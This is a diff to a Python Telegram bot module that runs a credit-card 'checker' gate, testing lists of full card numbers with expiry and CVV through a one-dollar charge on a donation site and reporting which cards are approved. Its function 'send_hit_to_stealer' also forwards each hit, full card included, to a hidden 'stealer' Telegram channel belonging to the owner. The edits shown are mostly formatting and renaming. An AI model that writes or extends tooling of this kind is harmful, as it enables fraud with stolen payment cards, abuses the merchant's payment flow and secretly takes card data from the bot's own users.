@@ -4,6 +4,7 @@ import re
 import random
 import requests
 import urllib3
+import os
 from html import unescape
 from pyrogram import Client, filters
 from FUNC.usersdb_func import *
@@ -15,7 +16,7 @@ from TOOLS.getcc_for_mass import *
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ========== CONFIGURATION ==========
-GATE_NAME = "Stripe 2$ charge"
+GATE_NAME = "BetterFuture 1$ Charge"
 MAX_MSC_LIMIT = 10
 MAX_TSC_LIMIT = 100
 
@@ -39,11 +40,11 @@ async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_ta
 {SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
 {SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
 {SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
-        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML")
+        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="html")
     except Exception as e:
         print(f"[Stealer Error] {e}")
 
-# ========== SYNC CHECKER (BetterFuture) ==========
+# ========== SYNC CHECKER ==========
 def extract_data():
     s = requests.Session()
     s.verify = False
@@ -212,7 +213,7 @@ async def bf_single(client, message):
                 f"✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦\n"
                 f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
                 f"↪ <b>ᴜꜱᴀɢᴇ :</b> /bf cc|mm|yy|cvv",
-                quote=True, parse_mode="HTML"
+                quote=True, parse_mode="html"
             )
             return
 
@@ -223,7 +224,7 @@ async def bf_single(client, message):
             f"✧ ᴄʜᴇᴄᴋɪɴɢ... ✧\n\n"
             f"{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>\n"
             f"{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>",
-            quote=True, parse_mode="HTML"
+            quote=True, parse_mode="html"
         )
 
         start = time.perf_counter()
@@ -249,7 +250,7 @@ async def bf_single(client, message):
 {SYMBOL} 𝗧ᴏᴏᴋ {elapsed:.2f} 𝘀ᴇᴄᴏɴᴅs
 {SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
 
-        await msg.edit_text(final_text, disable_web_page_preview=True, parse_mode="HTML")
+        await msg.edit_text(final_text, disable_web_page_preview=True, parse_mode="html")
         await setantispamtime(user_id)
         await deductcredit(user_id)
 
@@ -270,12 +271,12 @@ async def bf_mass(client, message):
 
         getcc = await getcc_for_mass(message, role)
         if not getcc[0]:
-            await message.reply_text(getcc[1], message.id)
+            await message.reply_text(getcc[1], message.id, parse_mode="html")
             return
         ccs = getcc[1]
 
         if len(ccs) > MAX_MSC_LIMIT:
-            await message.reply_text(f"✦ ᴍᴀx {MAX_MSC_LIMIT} ᴄᴄ ᴀʟʟᴏᴡᴇᴅ. ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇᴅ {len(ccs)} ✦", message.id)
+            await message.reply_text(f"✦ ᴍᴀx {MAX_MSC_LIMIT} ᴄᴄ ᴀʟʟᴏᴡᴇᴅ. ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇᴅ {len(ccs)} ✦", message.id, parse_mode="html")
             ccs = ccs[:MAX_MSC_LIMIT]
 
         await process_sequential_check(client, message, ccs, user_id, first_name, role)
@@ -305,7 +306,7 @@ async def bf_txt(client, message):
                 f"✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦\n"
                 f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
                 f"↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to a .txt file (max {MAX_TSC_LIMIT} cards)",
-                quote=True, parse_mode="HTML"
+                quote=True, parse_mode="html"
             )
             return
 
@@ -316,11 +317,11 @@ async def bf_txt(client, message):
         os.remove(file_path)
 
         if not ccs:
-            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
+            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True, parse_mode="html")
             return
 
         if len(ccs) > MAX_TSC_LIMIT:
-            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
+            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True, parse_mode="html")
             ccs = ccs[:MAX_TSC_LIMIT]
 
         await process_sequential_check(client, message, ccs, user_id, first_name, role)
@@ -328,7 +329,7 @@ async def bf_txt(client, message):
         import traceback
         await error_log(traceback.format_exc())
 
-# ========== SEQUENTIAL PROCESSING (shared) ==========
+# ========== SEQUENTIAL PROCESSING ==========
 async def process_sequential_check(client, message, ccs, user_id, first_name, role):
     total = len(ccs)
     approved_count = 0
@@ -342,7 +343,7 @@ async def process_sequential_check(client, message, ccs, user_id, first_name, ro
         f"Progress: 0/{total}\n"
         f"Approved ✅: 0\nDeclined ❌: 0\nRemaining: {total}\n\n"
         f"Checked by: {first_name} ({role})",
-        quote=True, parse_mode="HTML"
+        quote=True, parse_mode="html"
     )
 
     for idx, fullcc in enumerate(ccs, 1):
@@ -376,7 +377,7 @@ async def process_sequential_check(client, message, ccs, user_id, first_name, ro
             f"Progress: {idx}/{total}\n"
             f"Approved ✅: {approved_count}\nDeclined ❌: {declined_count}\nRemaining: {remaining}\n\n"
             f"Checked by: {first_name} ({role})",
-            parse_mode="HTML"
+            parse_mode="html"
         )
         await asyncio.sleep(0.5)
 
@@ -395,7 +396,7 @@ async def process_sequential_check(client, message, ccs, user_id, first_name, ro
 
 {SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
 {SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
-        await message.reply_text(approved_msg, quote=True, parse_mode="HTML")
+        await message.reply_text(approved_msg, quote=True, parse_mode="html")
         await asyncio.sleep(0.5)
 
     elapsed = round(time.perf_counter() - start_time, 2)
@@ -408,14 +409,14 @@ async def process_sequential_check(client, message, ccs, user_id, first_name, ro
         if declined_count > 15:
             decl_text += f"\n... and {declined_count - 15} more declined cards"
         decl_text += f"\n━━━━━━━━━━━━━━━━━━━━\n✅ Approved: {approved_count}\n❌ Declined: {declined_count}\n📊 Total: {total}\n⏱ Time: {elapsed}s\n👤 Checked by: {first_name} ({role})"
-        await message.reply_text(decl_text, quote=True, parse_mode="HTML")
+        await message.reply_text(decl_text, quote=True, parse_mode="html")
     else:
         await message.reply_text(
             f"❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅ𝘀\n\n"
             f"━━━━━━━━━━━━━━━━━━━━\n"
             f"📊 Total Cards: {total}\n❌ All Declined: {declined_count}\n⏱ Time: {elapsed}s\n"
             f"👤 Checked by: {first_name} ({role})",
-            quote=True, parse_mode="HTML"
+            quote=True, parse_mode="html"
         )
 
     await setantispamtime(user_id)
